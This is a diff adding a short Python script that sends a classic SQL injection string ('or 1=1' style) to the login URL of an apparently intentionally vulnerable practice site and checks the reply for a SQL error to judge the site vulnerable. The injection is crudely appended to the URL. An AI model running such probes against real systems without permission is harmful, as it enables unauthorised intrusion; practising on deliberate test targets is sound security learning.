@@ -1,0 +1,13 @@
+import sys
+import urllib
+import urllib.request
+
+#classic urllib structure
+website = urllib.request.urlopen('http://hackyourselffirst.troyhunt.com/Account/Login' + "=1\' or \'1'\ == \'1\'")
+output = website.read()
+fulloutput = output.decode('utf-8')
+
+if "You have an error in your SQL syntax" in fulloutput:
+    print ("The website is SQLi vulnerable")
+else:
+    print ("The website is not classic SQLi vulnerable")
